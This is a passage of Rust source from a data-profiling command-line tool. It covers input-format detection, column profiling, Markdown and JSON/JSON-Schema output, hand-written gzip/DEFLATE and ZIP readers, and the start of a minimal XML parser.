            "common-log" | "common_log" | "clf" | "common" => Ok(InputFormat::CommonLog),
            "combined-log" | "combined_log" | "combined" => Ok(InputFormat::CombinedLog),
            "syslog" | "syslog3164" | "rfc3164" => Ok(InputFormat::Syslog),
            "syslog5424" | "rfc5424" => Ok(InputFormat::Syslog5424),
            "dbase" | "dbf" => Ok(InputFormat::Dbase),
            "stata" | "dta" => Ok(InputFormat::Stata),
            "sas7bdat" | "sas" => Ok(InputFormat::Sas7bdat),
            other => {
                bail!(
                    "unrecognized --format '{other}' (expected csv, tsv, json, parquet, arrow, avro, xlsx, sqlite, msgpack, toml, yaml, cbor, ini, xml, fixed-width, npy, npz, common-log, combined-log, syslog, syslog5424, dbase, stata, or sas7bdat)"
                )
            }
        };
    }
    let ext = logical_path
        .extension()
        .and_then(|e| e.to_str())
        .unwrap_or("")
        .to_lowercase();
    match ext.as_str() {
        "csv" => Ok(InputFormat::Csv),
        "tsv" => Ok(InputFormat::Tsv),
        "json" | "jsonl" | "ndjson" => Ok(InputFormat::Json),
        "parquet" | "pqt" => Ok(InputFormat::Parquet),
        "arrow" | "feather" => Ok(InputFormat::ArrowIpc),
        "avro" => Ok(InputFormat::Avro),
        "xlsx" | "xls" | "xlsb" | "ods" => Ok(InputFormat::Xlsx),
        "db" | "sqlite" | "sqlite3" => Ok(InputFormat::Sqlite),
        "msgpack" | "mp" => Ok(InputFormat::MsgPack),
        "toml" => Ok(InputFormat::Toml),
        "yaml" | "yml" => Ok(InputFormat::Yaml),
        "cbor" => Ok(InputFormat::Cbor),
        "ini" => Ok(InputFormat::Ini),
        "xml" => Ok(InputFormat::Xml),
        "npy" => Ok(InputFormat::Npy),
        "npz" => Ok(InputFormat::Npz),
        "dbf" => Ok(InputFormat::Dbase),
        "dta" => Ok(InputFormat::Stata),
        "sas7bdat" => Ok(InputFormat::Sas7bdat),
        // The extension alone doesn't tell us - either there isn't one, or
        // it's not one of the above. Before giving up, try the file's own
        // bytes: fixed-width text and the four log formats have no magic
        // number or delimiter to sniff either (that's exactly why they're
        // --format-only above too), so a real hit here can only be one of
        // sniff_format's magic-backed formats.
        other => {
            if let Some(format) = sniff_format(read_path) {
                return Ok(format);
            }
            bail!(
                "can't infer format from extension '.{other}' - pass --format csv|tsv|json|parquet|arrow|avro|xlsx|sqlite|msgpack|toml|yaml|cbor|ini|xml|fixed-width|npy|npz|common-log|combined-log|syslog|syslog5424|dbase|stata|sas7bdat explicitly"
            )
        }
    }
}

// --- Shared profiling step (format-agnostic) ---

fn profile_column(col: ColumnInput, n_samples: usize) -> ColumnProfile {
    let non_null = &col.raw_values;
    let missing = col.total.saturating_sub(non_null.len());
    let missing_pct = round1(if col.total > 0 {
        missing as f64 / col.total as f64 * 100.0
    } else {
        0.0
    });

    let (ideal_type, mut notes) = if non_null.is_empty() {
        ("String".to_string(), "column is empty/all null".to_string())
    } else if col.skip_heuristics {
        (
            "String".to_string(),
            "nested value (array/object) - consider flattening before typing".to_string(),
        )
    } else {
        let refs: Vec<&str> = non_null.iter().map(|s| s.as_str()).collect();
        suggest_ideal_type(&refs, &col.current_type)
    };

    if missing_pct > 0.0 {
        let extra = "has missing values -> wrap in Option<T> / handle nulls";
        notes = if notes.is_empty() {
            extra.to_string()
        } else {
            format!("{notes}; {extra}")
        };
    }

    let mut seen = HashSet::new();
    let mut samples = Vec::new();
    for v in non_null {
        if seen.insert(v.as_str()) {
            samples.push(v.clone());
            if samples.len() >= n_samples {
                break;
            }
        }
    }

    ColumnProfile {
        name: col.name,
        current_type: col.current_type,
        ideal_type,
        description: String::new(),
        missing_pct,
        sample_values: samples,
        notes,
    }
}

fn render_markdown(file_name: &str, tables: &BTreeMap<String, Vec<ColumnProfile>>) -> String {
    let mut md = format!("# Data Dictionary: {file_name}\n\n");
    let show_headers = tables.len() > 1; // only multi-table sources (SQLite) get ## sections
    for (table_name, profiles) in tables {
        if show_headers {
            md.push_str(&format!("## {}\n\n", escape_md(table_name)));
        }
        md.push_str("| Column | Current Type | Ideal Type | Description | Missing % | Sample Values | Notes |\n");
        md.push_str("|---|---|---|---|---|---|---|\n");
        for p in profiles {
            md.push_str(&format!(
                "| {} | {} | {} | {} | {:.1}% | {} | {} |\n",
                escape_md(&p.name),
                escape_md(&p.current_type),
                escape_md(&p.ideal_type),
                escape_md(&p.description),
                p.missing_pct,
                escape_md(&p.sample_values.join(", ")),
                escape_md(&p.notes),
            ));
        }
        md.push('\n');
    }
    md.truncate(md.trim_end_matches('\n').len());
    md.push('\n');
    md
}

fn render_json(
    file_name: &str,
    format: &InputFormat,
    tables: &BTreeMap<String, Vec<ColumnProfile>>,
) -> Result<String> {
    // A plain struct (not a derive target - see ColumnProfile's own
    // Serialize impl above for why) so `file`/`format`/`tables` come out
    // in this declared order rather than an unordered map's sorted keys.
    // `tables` itself serializes fine through serde's blanket BTreeMap
    // impl once ColumnProfile: Serialize - a table-name-sorted JSON object
    // is exactly the shape already documented in CLAUDE.md.
    struct DataDictionary<'a> {
        file: &'a str,
        format: &'a str,
        tables: &'a BTreeMap<String, Vec<ColumnProfile>>,
    }
    impl serde::Serialize for DataDictionary<'_> {
        fn serialize<S>(&self, serializer: S) -> std::result::Result<S::Ok, S::Error>
        where
            S: serde::Serializer,
        {
            use serde::ser::SerializeStruct;
            let mut state = serializer.serialize_struct("DataDictionary", 3)?;
            state.serialize_field("file", &self.file)?;
            state.serialize_field("format", &self.format)?;
            state.serialize_field("tables", &self.tables)?;
            state.end()
        }
    }
    let doc = DataDictionary {
        file: file_name,
        format: format.as_str(),
        tables,
    };
    serde_json::to_string_pretty(&doc).context("failed to serialize JSON output")
}

// --- JSON-Schema-standard output (--output-format json-schema) ---
// A third, more interoperable JSON shape alongside this tool's own rich one
// above: json-schema.org's {"type": ..., "properties": {...}} vocabulary,
// built from each column's ideal_type. Deliberately lossy wherever
// ideal_type itself is lossy or ambiguous (mixed(...) types, flattened
// structs, "enum / category" without the full value list - only samples are
// kept, not the full domain) - those fall back to an unconstrained `{}`
// schema (valid JSON Schema for "anything goes") rather than guessing.

/// Maps an `ideal_type` label to a (JSON Schema type keyword, optional
/// "format" keyword) pair, for the scalar types that map cleanly onto one.
/// `None` covers everything else (mixed/struct/empty/unrecognized).
fn json_schema_scalar_type(ideal_type: &str) -> Option<(&'static str, Option<&'static str>)> {
    match ideal_type {
        "String" | "enum / category" => Some(("string", None)),
        "i64" => Some(("integer", None)),
        "f64" => Some(("number", None)),
        "bool" => Some(("boolean", None)),
        "NaiveDate / DateTime" => Some(("string", Some("date-time"))),
        "NaiveTime" => Some(("string", Some("time"))),
        "UUID" => Some(("string", Some("uuid"))),
        "Email" => Some(("string", Some("email"))),
        "IPv4" => Some(("string", Some("ipv4"))),
        "IPv6" => Some(("string", Some("ipv6"))),
        "URL" => Some(("string", Some("uri"))),
        // No registered json-schema.org format keyword exists for these, so
        // they still map to a plain "string" rather than falling through to
        // an unconstrained {} the way an unrecognized ideal_type would -
        // the underlying value is known for certain to be a string.
        "MAC Address" => Some(("string", None)),
        "IBAN" => Some(("string", None)),
        "Credit Card Number" => Some(("string", None)),
        "ISBN-10"
        | "ISBN-13"
        | "EAN-13 / UPC-A"
        | "SemVer"
        | "Hex Color"
        | "IMEI"
        | "JWT"
        | "Geographic Coordinates"
        | "VIN"
        | "CIDR"
        | "ULID"
        | "WKT Geometry"
        | "Cron Expression" => Some(("string", None)),
        _ => None,
    }
}

/// Nullable columns (missing_pct > 0) get a ["type", "null"] union instead of
/// a bare type string - the same "missing values never fake a type change"
/// principle the rest of this tool applies, expressed in schema form.
fn json_schema_type_value(base: &str, nullable: bool) -> JsonValue {
    if nullable {
        json!([base, "null"])
    } else {
        json!(base)
    }
}

fn json_schema_property(p: &ColumnProfile) -> JsonValue {
    let nullable = p.missing_pct > 0.0;

    if let Some(inner) = p
        .ideal_type
        .strip_prefix("Vec<")
        .and_then(|s| s.strip_suffix('>'))
    {
        let items = match json_schema_scalar_type(inner) {
            Some((t, Some(fmt))) => json!({"type": t, "format": fmt}),
            Some((t, None)) => json!({"type": t}),
            None => json!({}),
        };
        return json!({"type": json_schema_type_value("array", nullable), "items": items});
    }

    match json_schema_scalar_type(&p.ideal_type) {
        Some((t, Some(fmt))) => {
            json!({"type": json_schema_type_value(t, nullable), "format": fmt})
        }
        Some((t, None)) => json!({"type": json_schema_type_value(t, nullable)}),
        None => json!({}),
    }
}

fn render_json_schema(
    file_name: &str,
    tables: &BTreeMap<String, Vec<ColumnProfile>>,
) -> Result<String> {
    let mut table_schemas = serde_json::Map::new();
    for (table_name, profiles) in tables {
        let mut properties = serde_json::Map::new();
        let mut required = Vec::new();
        for p in profiles {
            properties.insert(p.name.clone(), json_schema_property(p));
            if p.missing_pct == 0.0 {
                required.push(JsonValue::String(p.name.clone()));
            }
        }
        let mut schema = serde_json::Map::new();
        schema.insert("type".to_string(), json!("object"));
        schema.insert("properties".to_string(), JsonValue::Object(properties));
        if !required.is_empty() {
            schema.insert("required".to_string(), JsonValue::Array(required));
        }
        table_schemas.insert(table_name.clone(), JsonValue::Object(schema));
    }

    let doc = json!({
        "$schema": "http://json-schema.org/draft-07/schema#",
        "file": file_name,
        "tables": table_schemas,
    });
    serde_json::to_string_pretty(&doc).context("failed to serialize JSON Schema output")
}

// --- Hand-rolled DEFLATE (RFC 1951) + gzip (RFC 1952) decoder ---
// gzip is the one compression format this project reads unconditionally
// (no --features gate - see below), so it's the one place hand-rolling
// pays off without touching an optional feature's own dependency budget.
// Decode-only (this tool never writes gzip, only reads it), and closely
// follows the structure of `puff.c` - Mark Adler's own minimal reference
// inflate implementation - rather than inventing an approach from first
// principles; DEFLATE's bit-packing (data elements LSB-first, but Huffman
// codes themselves packed MSB-first) is exactly the kind of detail worth
// getting from a known-correct reference rather than reasoning out fresh.
// Verified against real gzip files: the system `gzip` command and
// Python's `gzip`/`zlib` modules both reach for dynamic Huffman blocks
// (BTYPE 10) for anything non-trivial, not just the simpler stored/fixed
// cases (BTYPE 00/01) a partial implementation might stop at.

const MAX_BITS: usize = 15;

/// Reads DEFLATE's bitstream: multi-bit data elements (lengths, extra
/// bits, HLIT/HDIST/HCLEN) are packed LSB-first, filled lazily one whole
/// byte at a time so the underlying reader never advances further than
/// the bits actually consumed - which is what lets `gzip_decompress`
/// safely read the CRC32/ISIZE footer immediately after `inflate`
/// returns, with no explicit re-sync step.
struct BitReader<R> {
    inner: R,
    buf: u32,
    nbits: u32,
}

impl<R: std::io::Read> BitReader<R> {
    fn new(inner: R) -> Self {
        BitReader {
            inner,
            buf: 0,
            nbits: 0,
        }
    }

    fn bits(&mut self, need: u32) -> Result<u32> {
        while self.nbits < need {
            let mut byte = [0u8; 1];
            self.inner
                .read_exact(&mut byte)
                .context("unexpected end of DEFLATE stream")?;
            self.buf |= (byte[0] as u32) << self.nbits;
            self.nbits += 8;
        }
        let val = self.buf & ((1u32 << need) - 1);
        self.buf >>= need;
        self.nbits -= need;
        Ok(val)
    }

    /// Discards whatever's left of the byte currently buffered - needed
    /// before a stored block's LEN/NLEN fields, which always start at a
    /// real byte boundary regardless of where the preceding 3-bit block
    /// header left the bitstream.
    fn align_to_byte(&mut self) {
        self.buf = 0;
        self.nbits = 0;
    }

    fn read_u8(&mut self) -> Result<u8> {
        Ok(self.bits(8)? as u8)
    }

    fn read_u16_le(&mut self) -> Result<u16> {
        let lo = self.read_u8()? as u16;
        let hi = self.read_u8()? as u16;
        Ok(lo | (hi << 8))
    }
}

/// A canonical Huffman decode table (RFC 1951 3.2.2): `counts[len]` is how
/// many symbols have that code length, `symbols` holds every coded symbol
/// ordered first by length then by symbol index within that length - the
/// same layout `puff.c`'s `construct()` builds, which is what makes
/// `decode` below able to find a symbol without ever materializing an
/// actual code->symbol map.
struct HuffmanTable {
    counts: [u16; MAX_BITS + 1],
    symbols: Vec<u16>,
}

impl HuffmanTable {
    fn build(lengths: &[u8]) -> Result<Self> {
        let mut counts = [0u16; MAX_BITS + 1];
        for &len in lengths {
            counts[len as usize] += 1;
        }
        counts[0] = 0;

        // Reject an over-subscribed code (more codes at some length than
        // fit) - the only case genuinely invalid at construction time. A
        // few too few codes ("incomplete") is left alone: RFC 1951
        // permits exactly one real case of it (a distance table with only
        // one distance value ever used), and any other incomplete table
        // simply never gets asked to decode its missing code, since a
        // valid encoder never emits one.
        let mut left: i32 = 1;
        for &count in counts.iter().skip(1) {
            left <<= 1;
            left -= count as i32;
            if left < 0 {
                bail!("invalid DEFLATE stream: over-subscribed Huffman code");
            }
        }

        let mut offsets = [0u16; MAX_BITS + 2];
        for len in 1..MAX_BITS {
            offsets[len + 1] = offsets[len] + counts[len];
        }
        let mut next = offsets;
        let mut symbols = vec![0u16; lengths.len()];
        for (sym, &len) in lengths.iter().enumerate() {
            if len != 0 {
                symbols[next[len as usize] as usize] = sym as u16;
                next[len as usize] += 1;
            }
        }

        Ok(HuffmanTable { counts, symbols })
    }

    fn decode<R: std::io::Read>(&self, bits: &mut BitReader<R>) -> Result<u16> {
        let mut code: i32 = 0;
        let mut first: i32 = 0;
        let mut index: i32 = 0;
        for len in 1..=MAX_BITS {
            code |= bits.bits(1)? as i32;
            let count = self.counts[len] as i32;
            if code - first < count {
                return Ok(self.symbols[(index + (code - first)) as usize]);
            }
            index += count;
            first += count;
            first <<= 1;
            code <<= 1;
        }
        bail!("invalid DEFLATE stream: Huffman code not found in table")
    }
}

// RFC 1951 3.2.5's length/distance base values and their extra-bit counts.
const LENGTH_BASE: [u16; 29] = [
    3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 15, 17, 19, 23, 27, 31, 35, 43, 51, 59, 67, 83, 99, 115, 131,
    163, 195, 227, 258,
];
const LENGTH_EXTRA: [u8; 29] = [
    0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 2, 2, 2, 2, 3, 3, 3, 3, 4, 4, 4, 4, 5, 5, 5, 5, 0,
];
const DIST_BASE: [u16; 30] = [
    1, 2, 3, 4, 5, 7, 9, 13, 17, 25, 33, 49, 65, 97, 129, 193, 257, 385, 513, 769, 1025, 1537,
    2049, 3073, 4097, 6145, 8193, 12289, 16385, 24577,
];
const DIST_EXTRA: [u8; 30] = [
    0, 0, 0, 0, 1, 1, 2, 2, 3, 3, 4, 4, 5, 5, 6, 6, 7, 7, 8, 8, 9, 9, 10, 10, 11, 11, 12, 12, 13,
    13,
];
// RFC 1951 3.2.7's fixed, spec-mandated order the HCLEN code-length code
// lengths themselves arrive in - not related to any of the tables above.
const CLEN_ORDER: [usize; 19] = [
    16, 17, 18, 0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14, 1, 15,
];

/// Decodes one compressed block's symbol stream (shared by fixed and
/// dynamic Huffman blocks - they differ only in which tables they hand
/// in) directly into `out`, stopping at the end-of-block symbol (256).
/// Back-references index straight into `out` itself rather than a
/// bounded sliding window, matching every other reader in this project
/// (CSV/JSON/YAML/... all read their whole input into memory too - see
/// CLAUDE.md's Dependency footprint section).
fn inflate_block<R: std::io::Read>(
    bits: &mut BitReader<R>,
    out: &mut Vec<u8>,
    lencode: &HuffmanTable,
    distcode: &HuffmanTable,
) -> Result<()> {
    loop {
        let symbol = lencode.decode(bits)?;
        if symbol < 256 {
            out.push(symbol as u8);
        } else if symbol == 256 {
            return Ok(());
        } else {
            let idx = (symbol - 257) as usize;
            if idx >= LENGTH_BASE.len() {
                bail!("invalid DEFLATE stream: bad length code {symbol}");
            }
            let length = LENGTH_BASE[idx] as usize + bits.bits(LENGTH_EXTRA[idx] as u32)? as usize;
            let dsym = distcode.decode(bits)? as usize;
            if dsym >= DIST_BASE.len() {
                bail!("invalid DEFLATE stream: bad distance code {dsym}");
            }
            let dist = DIST_BASE[dsym] as usize + bits.bits(DIST_EXTRA[dsym] as u32)? as usize;
            if dist > out.len() {
                bail!(
                    "invalid DEFLATE stream: distance {dist} goes further back than any output produced so far"
                );
            }
            let start = out.len() - dist;
            out.reserve(length);
            for i in 0..length {
                out.push(out[start + i]);
            }
        }
    }
}

/// RFC 1951 3.2.6's fixed Huffman code lengths - used verbatim, not
/// derived, since the spec defines these as literal constants.
fn fixed_tables() -> (HuffmanTable, HuffmanTable) {
    let mut lengths = [0u8; 288];
    lengths[0..144].fill(8);
    lengths[144..256].fill(9);
    lengths[256..280].fill(7);
    lengths[280..288].fill(8);
    let lencode =
        HuffmanTable::build(&lengths).expect("the fixed literal/length table is always valid");

    let dlengths = [5u8; 30];
    let distcode =
        HuffmanTable::build(&dlengths).expect("the fixed distance table is always valid");

    (lencode, distcode)
}

/// RFC 1951 3.2.7's dynamic Huffman header: HLIT/HDIST/HCLEN counts, the
/// HCLEN "code length code" itself, then that code used to decode the
/// real literal/length and distance table's code lengths (with repeat
/// codes 16/17/18 for runs, since a table can have hundreds of entries).
fn dynamic_tables<R: std::io::Read>(
    bits: &mut BitReader<R>,
) -> Result<(HuffmanTable, HuffmanTable)> {
    let hlit = bits.bits(5)? as usize + 257;
    let hdist = bits.bits(5)? as usize + 1;
    let hclen = bits.bits(4)? as usize + 4;

    let mut clen_lengths = [0u8; 19];
    for i in 0..hclen {
        clen_lengths[CLEN_ORDER[i]] = bits.bits(3)? as u8;
    }
    let clen_table = HuffmanTable::build(&clen_lengths)?;

    let mut lengths: Vec<u8> = Vec::with_capacity(hlit + hdist);
    while lengths.len() < hlit + hdist {
        let sym = clen_table.decode(bits)?;
        match sym {
            0..=15 => lengths.push(sym as u8),
            16 => {
                let prev = *lengths.last().ok_or_else(|| {
                    anyhow!(
                        "invalid DEFLATE stream: repeat-previous code length with no previous value"
                    )
                })?;
                let rep = 3 + bits.bits(2)?;
                lengths.resize(lengths.len() + rep as usize, prev);
            }
            17 => {
                let rep = 3 + bits.bits(3)?;
                lengths.resize(lengths.len() + rep as usize, 0);
            }
            18 => {
                let rep = 11 + bits.bits(7)?;
                lengths.resize(lengths.len() + rep as usize, 0);
            }
            _ => bail!("invalid DEFLATE stream: bad code-length symbol {sym}"),
        }
    }
    if lengths.len() != hlit + hdist {
        bail!("invalid DEFLATE stream: code-length repeat overran the table");
    }
    let lencode = HuffmanTable::build(&lengths[..hlit])?;
    let distcode = HuffmanTable::build(&lengths[hlit..])?;
    Ok((lencode, distcode))
}

/// Decodes a raw DEFLATE stream (no gzip/zlib wrapper) to its full
/// uncompressed bytes.
fn inflate<R: std::io::Read>(input: R) -> Result<Vec<u8>> {
    let mut bits = BitReader::new(input);
    let mut out = Vec::new();
    loop {
        let bfinal = bits.bits(1)?;
        let btype = bits.bits(2)?;
        match btype {
            0 => {
                bits.align_to_byte();
                let len = bits.read_u16_le()?;
                let nlen = bits.read_u16_le()?;
                if len != !nlen {
                    bail!("invalid DEFLATE stream: stored block length check failed");
                }
                out.reserve(len as usize);
                for _ in 0..len {
                    out.push(bits.read_u8()?);
                }
            }
            1 => {
                let (lencode, distcode) = fixed_tables();
                inflate_block(&mut bits, &mut out, &lencode, &distcode)?;
            }
            2 => {
                let (lencode, distcode) = dynamic_tables(&mut bits)?;
                inflate_block(&mut bits, &mut out, &lencode, &distcode)?;
            }
            _ => bail!("invalid DEFLATE stream: reserved block type 3"),
        }
        if bfinal == 1 {
            break;
        }
    }
    Ok(out)
}

/// CRC-32 (IEEE 802.3, the same polynomial gzip's own footer uses),
/// table-based and built once per process via `OnceLock` rather than a
/// `lazy_static`-style dependency - std alone is enough for this.
fn crc32(data: &[u8]) -> u32 {
    static TABLE: std::sync::OnceLock<[u32; 256]> = std::sync::OnceLock::new();
    let table = TABLE.get_or_init(|| {
        let mut table = [0u32; 256];
        for (i, entry) in table.iter_mut().enumerate() {
            let mut c = i as u32;
            for _ in 0..8 {
                c = if c & 1 != 0 {
                    0xEDB8_8320 ^ (c >> 1)
                } else {
                    c >> 1
                };
            }
            *entry = c;
        }
        table
    });

    let mut crc = 0xFFFF_FFFFu32;
    for &b in data {
        crc = table[((crc ^ b as u32) & 0xFF) as usize] ^ (crc >> 8);
    }
    crc ^ 0xFFFF_FFFF
}

fn read_null_terminated<R: std::io::Read>(input: &mut R) -> Result<()> {
    let mut byte = [0u8; 1];
    loop {
        input.read_exact(&mut byte)?;
        if byte[0] == 0 {
            return Ok(());
        }
    }
}

/// Parses a gzip container (RFC 1952) around the raw DEFLATE stream:
/// header (with its optional FEXTRA/FNAME/FCOMMENT/FHCRC fields, each
/// gated by its own flag bit and skipped rather than interpreted, since
/// none of them affect the decompressed bytes), the compressed data
/// itself, then a footer whose CRC32 and ISIZE are checked against what
/// was actually decompressed - catching real data corruption a purely
/// structural decode wouldn't (a bit-flipped byte deep in a compressed
/// block can still often decode to *some* well-formed-looking output).
fn gzip_decompress<R: std::io::Read>(input: R) -> Result<Vec<u8>> {
    use std::io::Read;
    let mut input = std::io::BufReader::new(input);

    let mut header = [0u8; 10];
    input
        .read_exact(&mut header)
        .context("failed to read gzip header")?;
    if header[0] != 0x1f || header[1] != 0x8b {
        bail!("not a valid gzip file (bad magic bytes)");
    }
    if header[2] != 8 {
        bail!("unsupported gzip compression method (only DEFLATE is supported)");
    }
    let flags = header[3];

    if flags & 0x04 != 0 {
        // FEXTRA
        let mut len_buf = [0u8; 2];
        input
            .read_exact(&mut len_buf)
            .context("failed to read gzip FEXTRA length")?;
        let mut skip = vec![0u8; u16::from_le_bytes(len_buf) as usize];
        input
            .read_exact(&mut skip)
            .context("failed to read gzip FEXTRA data")?;
    }
    if flags & 0x08 != 0 {
        read_null_terminated(&mut input).context("failed to read gzip FNAME")?;
    }
    if flags & 0x10 != 0 {
        read_null_terminated(&mut input).context("failed to read gzip FCOMMENT")?;
    }
    if flags & 0x02 != 0 {
        // FHCRC - a checksum of the header only, not verified (the
        // footer's CRC32 of the actual decompressed data below is the
        // check that matters for catching real corruption).
        let mut crc16 = [0u8; 2];
        input
            .read_exact(&mut crc16)
            .context("failed to read gzip FHCRC")?;
    }

    let decompressed = inflate(&mut input)?;

    let mut footer = [0u8; 8];
    input
        .read_exact(&mut footer)
        .context("failed to read gzip footer")?;
    let expected_crc = u32::from_le_bytes([footer[0], footer[1], footer[2], footer[3]]);
    let expected_isize = u32::from_le_bytes([footer[4], footer[5], footer[6], footer[7]]);

    if crc32(&decompressed) != expected_crc {
        bail!("gzip CRC32 checksum mismatch - the file is corrupt or truncated");
    }
    if (decompressed.len() as u64 & 0xFFFF_FFFF) as u32 != expected_isize {
        bail!("gzip size checksum mismatch - the file is corrupt or truncated");
    }

    Ok(decompressed)
}

// --- Hand-rolled ZIP reader (PKWARE APPNOTE.TXT) ---
// Shared infrastructure for .xlsx/.xlsb/.ods and .npz, which are all a ZIP
// archive of other files (OOXML/ODF XML documents, XLSB's own binary
// records, or - for .npz - named .npy streams) under the hood - see
// CLAUDE.md's Dependency footprint section. Reads the archive entirely
// from its central directory (the authoritative index at the end of the
// file), the same way every real ZIP reader does, rather than scanning
// local file headers in order - a local header's own size/CRC fields
// aren't even guaranteed reliable (the "data descriptor" bit in its flags
// means they can be zeroed, with the real values written *after* the
// compressed data instead), so trusting the central directory's copy of
// those fields throughout is a correctness requirement, not just a
// convenience. Compression method 8 (DEFLATE) reuses `inflate` above
// directly; method 0 (stored) is a raw copy. ZIP64 (needed past 4GB or
// 65,535 entries - never realistic for a spreadsheet's own small XML
// parts, or a NumPy archive's own arrays) is detected and rejected with a
// clear error rather than silently misread, the same "clean error over
// silent misread" contract every other format in this project already
// gives an unsupported case.

// Gated behind either of the two independently-toggleable features that
// need it (`xlsx` for .xlsx/.xlsb/.ods, `npy` for .npz) rather than living
// inside `xlsx_support` itself and being duplicated for `npy_support` the
// way the OOXML-scoped and general-purpose XML parsers deliberately are
// (see that pair's own entry in CLAUDE.md's Dependency footprint section)
// - there's no behavioral divergence a ZIP reader would ever need between
// the two callers, so sharing one implementation is strictly better here,
// not just more convenient.
#[cfg(any(feature = "xlsx", feature = "npy"))]
mod zip_support {
    use super::*;

    const ZIP_EOCD_SIG: [u8; 4] = [0x50, 0x4B, 0x05, 0x06];
    const ZIP_CENTRAL_DIR_SIG: [u8; 4] = [0x50, 0x4B, 0x01, 0x02];
    const ZIP_LOCAL_HEADER_SIG: [u8; 4] = [0x50, 0x4B, 0x03, 0x04];

    fn zip_read_u16(data: &[u8], pos: usize) -> Result<u16> {
        let b = data
            .get(pos..pos + 2)
            .context("unexpected end of zip data")?;
        Ok(u16::from_le_bytes([b[0], b[1]]))
    }

    fn zip_read_u32(data: &[u8], pos: usize) -> Result<u32> {
        let b = data
            .get(pos..pos + 4)
            .context("unexpected end of zip data")?;
        Ok(u32::from_le_bytes([b[0], b[1], b[2], b[3]]))
    }

    pub(crate) struct ZipEntry {
        pub(crate) name: String,
        local_header_offset: u32,
        compressed_size: u32,
        uncompressed_size: u32,
        method: u16,
        pub(crate) crc32: u32,
    }

    pub(crate) struct ZipArchive {
        data: Vec<u8>,
        pub(crate) entries: Vec<ZipEntry>,
    }

    impl ZipArchive {
        pub(crate) fn open(path: &Path) -> Result<Self> {
            let data = fs::read(path).with_context(|| format!("failed to read {path:?}"))?;
            let eocd_pos = Self::find_eocd(&data)?;

            let entry_count = zip_read_u16(&data, eocd_pos + 10)?;
            let central_dir_size = zip_read_u32(&data, eocd_pos + 12)?;
            let central_dir_offset = zip_read_u32(&data, eocd_pos + 16)?;
            if central_dir_offset == 0xFFFF_FFFF
                || central_dir_size == 0xFFFF_FFFF
                || entry_count == 0xFFFF
            {
                bail!("zip64 archives are not supported");
            }

            let mut entries = Vec::with_capacity(entry_count as usize);
            let mut pos = central_dir_offset as usize;
            for _ in 0..entry_count {
                let sig = data
                    .get(pos..pos + 4)
                    .context("truncated zip central directory")?;
                if sig != ZIP_CENTRAL_DIR_SIG {
                    bail!("invalid zip central directory entry signature");
                }
                let method = zip_read_u16(&data, pos + 10)?;
                let crc32 = zip_read_u32(&data, pos + 16)?;
                let compressed_size = zip_read_u32(&data, pos + 20)?;
                let uncompressed_size = zip_read_u32(&data, pos + 24)?;
                let name_len = zip_read_u16(&data, pos + 28)? as usize;
                let extra_len = zip_read_u16(&data, pos + 30)? as usize;
                let comment_len = zip_read_u16(&data, pos + 32)? as usize;
                let local_header_offset = zip_read_u32(&data, pos + 42)?;
                let name_start = pos + 46;
                let name_bytes = data
                    .get(name_start..name_start + name_len)
                    .context("truncated zip entry name")?;
                entries.push(ZipEntry {
                    name: String::from_utf8_lossy(name_bytes).into_owned(),
                    local_header_offset,
                    compressed_size,
                    uncompressed_size,
                    method,
                    crc32,
                });
                pos = name_start + name_len + extra_len + comment_len;
            }

            Ok(ZipArchive { data, entries })
        }

        /// The end-of-central-directory record's signature must be searched
        /// for backward from the end of the file, since it's followed by a
        /// variable-length (0-65,535 byte) archive comment.
        fn find_eocd(data: &[u8]) -> Result<usize> {
            if data.len() < 22 {
                bail!("not a valid zip archive: too short");
            }
            let scan_start = data.len().saturating_sub(22 + 65_535);
            (scan_start..=data.len() - 22)
                .rev()
                .find(|&pos| data[pos..pos + 4] == ZIP_EOCD_SIG)
                .context("not a valid zip archive: end of central directory record not found")
        }

        pub(crate) fn names(&self) -> impl Iterator<Item = &str> {
            self.entries.iter().map(|e| e.name.as_str())
        }

        pub(crate) fn read(&self, name: &str) -> Result<Vec<u8>> {
            let entry = self
                .entries
                .iter()
                .find(|e| e.name == name)
                .ok_or_else(|| anyhow!("zip archive has no entry named '{name}'"))?;

            let pos = entry.local_header_offset as usize;
            let sig = self
                .data
                .get(pos..pos + 4)
                .context("truncated zip local header")?;
            if sig != ZIP_LOCAL_HEADER_SIG {
                bail!(
                    "invalid zip local file header signature for '{}'",
                    entry.name
                );
            }
            let name_len = zip_read_u16(&self.data, pos + 26)? as usize;
            let extra_len = zip_read_u16(&self.data, pos + 28)? as usize;
            let data_start = pos + 30 + name_len + extra_len;
            let compressed = self
                .data
                .get(data_start..data_start + entry.compressed_size as usize)
                .with_context(|| format!("truncated zip entry data for '{}'", entry.name))?;

            let decompressed = match entry.method {
                0 => compressed.to_vec(),
                8 => inflate(compressed)
                    .with_context(|| format!("failed to inflate zip entry '{}'", entry.name))?,
                other => bail!(
                    "unsupported zip compression method {other} for '{}' - only stored (0) and deflate (8) are supported",
                    entry.name
                ),
            };
            if decompressed.len() as u64 != u64::from(entry.uncompressed_size) {
                bail!(
                    "zip entry '{}' decompressed to {} bytes, expected {}",
                    entry.name,
                    decompressed.len(),
                    entry.uncompressed_size
                );
            }
            if crc32(&decompressed) != entry.crc32 {
                bail!(
                    "zip CRC32 checksum mismatch for '{}' - the file is corrupt or truncated",
                    entry.name
                );
            }
            Ok(decompressed)
        }
    }
} // mod zip_support

#[cfg(feature = "xlsx")]
mod xlsx_support {
    use super::zip_support::ZipArchive;
    use super::*;

    // --- Hand-rolled minimal XML parser ---
    // Scoped deliberately narrowly: just enough to read the well-formed,
    // machine-generated XML inside a .xlsx/.ods archive (OOXML/ODF's own
    // schemas), not a general-purpose replacement for the `xmltree` crate
    // this project's separate `xml` feature already depends on for arbitrary
    // user-supplied XML - see CLAUDE.md's Dependency footprint section. No
    // DTD/external-entity support (OOXML/ODF documents never carry one), no
    // namespace-URI resolution (this project only ever needs a raw tag/
    // attribute name to look up a fixed, known schema element - the `r:id`-
    // style prefix on an attribute name is significant on its own, the same
    // way `xml_element_to_json`'s `@`-prefixed attributes work for the `xml`
    // feature's own reader), and only the 5 predefined entities plus numeric
    // character references - what every OOXML/ODF writer actually emits.

    pub(crate) struct XmlElement {
        pub(crate) name: String,
        attrs: Vec<(String, String)>,
        children: Vec<XmlElement>,
        text: String,
    }

    impl XmlElement {
        pub(crate) fn attr(&self, name: &str) -> Option<&str> {
            self.attrs
                .iter()
                .find(|(k, _)| k == name)
                .map(|(_, v)| v.as_str())
        }

